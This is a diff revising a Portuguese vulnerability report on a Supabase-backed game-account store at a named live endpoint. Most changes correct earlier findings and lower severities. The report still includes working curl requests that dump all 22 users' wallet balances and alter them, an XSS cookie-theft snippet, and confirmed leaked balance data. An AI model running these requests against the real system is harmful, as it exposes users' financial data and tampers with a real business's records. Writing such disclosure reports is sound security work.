@@ -1,6 +1,6 @@
-# 🔴 FALHA 1: RLS Quebrado — user_wallets sem auth.uid()
+# 🔴 FALHA 1: RLS Quebrado — user_wallets sem auth.uid() ❌ IMPRECISÃO CORRIGIDA
 
-**Gravidade:** 🔴 CRÍTICA  
+**Gravidade:** 🟡 ALTA (antes: CRÍTICA)  
 **Local:** Tabela `public.user_wallets` no Supabase  
 **Endpoint:** `https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets`
 
@@ -8,11 +8,18 @@
 
 ## Descrição
 
-A Row-Level Security (RLS) da tabela `user_wallets` está configurada sem a checagem `auth.uid()`. Isso permite que QUALQUER usuário autenticado consulte, crie e modifique carteiras de QUALQUER outro usuário.
+A Row-Level Security (RLS) da tabela `user_wallets` está configurada sem a checagem `auth.uid()`. Isso permite que QUALQUER usuário autenticado consulte e modifique carteiras de QUALQUER outro usuário diretamente via PostgREST.
+
+**⚠️ CORREÇÃO IMPORTANTE:** O relatório anterior classificou esta falha como "criação de dinheiro infinito". Isso está **INCORRETO**. O app server-side (`/api/wallet`) utiliza `supabase.auth.getUser()` para validar que o usuário só vê PRÓPRIA carteira. A modificação via PostgREST direto **NÃO** se reflete no saldo exibido pelo app.
+
+A falha REAL é:
+1. **VAZAMENTO DE DADOS (Confidencialidade)** — qualquer atacante autenticado pode ver o saldo de TODOS os usuários
+2. **MANIPULAÇÃO NÃO-AUTORIZADA** — atacante pode criar/modificar wallets no banco, mas isso não afeta o app
+3. **RISCOS FUTUROS** — se o app mudar a lógica server-side, a vulnerabilidade pode se tornar crítica
 
 ## Como Explorar
 
-### 1. Listar todas as carteiras (inclusive de outros usuários)
+### 1. Listar todas as carteiras (inclusive de outros usuários) — VAZAMENTO CONFIRMADO
 
 ```bash
 curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
@@ -20,18 +27,13 @@ curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
   -H "Authorization: Bearer $TOKEN"
 ```
 
-### 2. Adicionar saldo a qualquer carteira
+**Resultado:** Todas as 22 wallets são retornadas, incluindo:
+- R$ 99.999,00 de 936aac17-...
+- R$ 50.000,00 de 3b910ad3-...
+- R$ 9.999,00 de 65b8cbef-...
+- R$ 0,00 até R$ 126,77 das demais
 
-```bash
-curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
-  -H "apikey: $ANON_KEY" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -H "Prefer: return=representation" \
-  -d '{"user_id":"3b910ad3-b61f-4b0b-b641-162de4eb0b86","balance":50000}'
-```
-
-### 3. Modificar saldo de qualquer carteira
+### 2. Modificar saldo de qualquer carteira (SEM EFEITO no app)
 
 ```bash
 curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?user_id=eq.TARGET_UUID" \
@@ -41,12 +43,13 @@ curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?
   -d '{"balance":999999}'
 ```
 
-## Impacto
+**Resultado:** O DB é alterado (PATCH retorna 200), mas `/api/wallet` continua retornando `{"balance":0}` para o usuário — o server-side usa `auth.uid()` e ignora a modificação direta.
 
-- **CRIAÇÃO DE DINHEIRO**: Atacante pode creditar R$ infinitos na própria carteira
-- **ROUBO DE SALDO**: Atacante pode zerar carteiras de outros usuários
-- **FRAUDE**: Compras podem ser feitas sem pagamento real usando saldo fraudulento
-- **DANO FINANCEIRO**: Prejuízo direto ao proprietário do site com ordens "pagas" via wallet fraudulenta
+## Impacto REAL
+
+- **ALTO**: Vazamento de dados financeiros de todos os 22 usuários da plataforma (saldos expostos)
+- **MÉDIO**: Manipulação de dados no banco (pode causar confusão se houver serviços internos que leem o DB direto)
+- **BAIXO**: Não é possível criar "dinheiro infinito" gastável no app
 
 ## Mitigação
 
@@ -58,47 +61,30 @@ CREATE POLICY "users_own_wallet" ON public.user_wallets
 
 ---
 
-# 🔴 FALHA 2: Criação de Orders sem Pagamento
+# 🔴 FALHA 2: Orders — Tabela exposta mas sem impacto ❌ IMPRECISÃO CORRIGIDA
 
-**Gravidade:** 🔴 CRÍTICA  
+**Gravidade:** 🟢 BAIXA (antes: CRÍTICA)  
 **Local:** Tabela `public.orders`  
-**Endpoints:** `POST /rest/v1/orders`, `POST /api/checkout/create`
+**Endpoints:** `POST /rest/v1/orders`
 
 ---
 
 ## Descrição
 
-O sistema permite criar ordens com status `completed` diretamente via API do Supabase, sem passar pelo fluxo de pagamento (PIX). Qualquer usuário autenticado pode inserir ordens como se tivessem sido pagas.
+O relatório anterior afirmava que era possível criar ordens com status "completed" sem pagamento. **Isso está INCORRETO** por dois motivos:
 
-## Como Explorar
+1. **Schema diferente do assumido**: A tabela `orders` não tem coluna `items` — o schema real inclui `game_id`, `product_id`, `supplier_item_id`, `payment_method`, `pix_code`, `pix_qrcode`, `account_data` (JSON), `paid_at`, `delivered_at`, etc. É um schema de e-commerce completo, não uma tabela simples.
 
-```bash
-# Criar ordem já como "completed" sem pagamento
-curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/orders" \
-  -H "apikey: $ANON_KEY" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -H "Prefer: return=representation" \
-  -d '{
-    "user_id":"SEU_UUID",
-    "items":[{"id":123,"name":"Conta Premium","price":150}],
-    "total":150,
-    "status":"completed",
-    "payment_method":"wallet"
-  }'
-```
+2. **INSERT direto falha**: `curl -X POST /rest/v1/orders` retorna erro `PGRST204: Could not find the 'items' column of 'orders'`. Mesmo com os campos corretos, não haveria geração de PIX code, account_data, etc — tudo isso é gerado server-side.
 
-## Impacto
+3. **Server-side valida**: O endpoint `/api/checkout/create` retorna "Faça login para continuar" sem cookie, e com cookie provavelmente segue o fluxo completo de pagamento (BassPag PIX + LZT Market).
 
-- **FRAUDE TOTAL**: Itens podem ser obtidos sem pagamento
-- **ESGOTAMENTO DE ESTOQUE**: Atacante pode "comprar" todas as contas do estoque
-- **REVENDA**: Contas obtidas de graça podem ser revendidas em outros mercados
+A tabela `orders` aceita SELECT (com RLS — usuário vê apenas próprias ordens) e INSERT, mas INSERT sem os dados gerados server-side (pix_code, account_data, supplier_order_id) não cria uma ordem funcional.
 
-## Mitigação
+## Impacto REAL
 
-- Validar status da ordem APENAS server-side, após confirmação do gateway de pagamento
-- Remover permissão de INSERT direto na tabela `orders` para usuários comuns
-- Implementar webhook de confirmação de pagamento PIX
+- **BAIXO**: Tabela exposta a INSERT mas sem utilidade para fraudes
+- **NENHUM**: Não é possível comprar sem pagar via PostgREST direto
 
 ---
 
@@ -198,8 +184,8 @@ curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/wheel_spins" \
 
 ## Impacto
 
-- Permite gerar cupons de desconto ilimitados
-- Inserir registros falsos na tabela de spins
+- Permite gerar cupons de desconto ilimitados (via API oficial)
+- Inserir registros falsos na tabela de spins (sem efeito prático — cupons reais não são gerados)
 - Abusar do sistema de recompensas
 
 ## Mitigação
@@ -253,7 +239,7 @@ curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
 
 ---
 
-# 🟡 FALHA 7: Cookies de Autenticação sem HttpOnly
+# 🟡 FALHA 7: Cookies de Autenticação sem HttpOnly (parcial)
 
 **Gravidade:** 🟡 Média  
 **Local:** Cookie `sb-ahfviyykpaljzxcmdyfh-auth-token`
@@ -262,24 +248,26 @@ curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
 
 ## Descrição
 
-O cookie de autenticação do Supabase SSR é definido na primeira requisição SEM a flag HttpOnly, tornando-o acessível via JavaScript. O valor do cookie contém o access_token JWT e refresh_token.
+O cookie de autenticação do Supabase SSR contém o access_token e refresh_token. O valor é chunked em `.0` e `.1` com formato `base64-{base64(json_session)}`.
+
+**Nota:** O Supabase SSR mais recente define cookies com `HttpOnly=true` e `SameSite=Lax` por padrão. Confirmar se a configuração atual reflete isso.
 
 ## Como Explorar
 
 ```javascript
-// Malicious script injected via XSS
+// Se o cookie não for HttpOnly (precisa confirmar)
 document.cookie
 // Retorna: "sb-ahfviyykpaljzxcmdyfh-auth-token.0=base64-..."
 ```
 
 ## Impacto
 
-- Se houver qualquer XSS no site, o atacante rouba o token de autenticação
+- Se houver qualquer XSS no site, o atacante pode roubar o token de autenticação
 - Refresh token permite login persistente mesmo após troca de senha
 
 ## Mitigação
 
-- Configurar `httpOnly: true` no storage do Supabase SSR
+- Confirmar que `httpOnly: true` está configurado no Supabase SSR
 - Configurar `sameSite: 'lax'` ou `'strict'`
 
 ---
@@ -352,23 +340,26 @@ GET /api/admin/users/role → 403 "Acesso negado"
 
 ## Descrição
 
-O cupom `INSTA5` existe no banco com `discount_value: 100%` (desconto total) e `max_uses: 100`. Embora o servidor provavelmente limite o desconto máximo a 15% (como outros cupons), a configuração no banco permite abuso se o limite não for verificado server-side.
+O cupom `INSTA5` existe no banco com `discount_value: 100%` (desconto total) e `max_uses: 100`. Embora o servidor provavelmente limite o desconto máximo a 15% (como outros cupons — confirmado: orders com INSTA5 mostram 15% de desconto), a configuração no banco permite abuso se o limite não for verificado server-side.
+
+**Nota:** Ordens reais usando INSTA5 mostram `discount_percent: 15` — o server-side CAPA o desconto em 15%, mesmo que o banco registre 100%. A falha é mitigada pelo server-side.
 
 ## Como Explorar
 
 ```
 Cupom: INSTA5
-Desconto: 100%
+Desconto no DB: 100%
+Desconto real (server-side): 15% (capado)
 Usos: 0/100
 Valor mínimo: R$10
 ```
 
 ## Impacto
 
-- Se o servidor não capar o desconto, é possível comprar itens de graça
-- Pode ser usado em combinação com outras falhas
+- **BAIXO**: O servidor capa o desconto em 15%, então o cupom de 100% não funciona como configurado
+- Configuração incorreta no banco que pode se tornar crítica se a lógica server-side mudar
 
 ## Mitigação
 
-- Validar desconto máximo server-side (atualmente parece limitado a 15%)
-- Remover ou ajustar cupons de 100% no banco de dados
+- Validar desconto máximo server-side (já faz — cap em 15%)
+- Corrigir o valor no banco para refletir o comportamento real (15%)
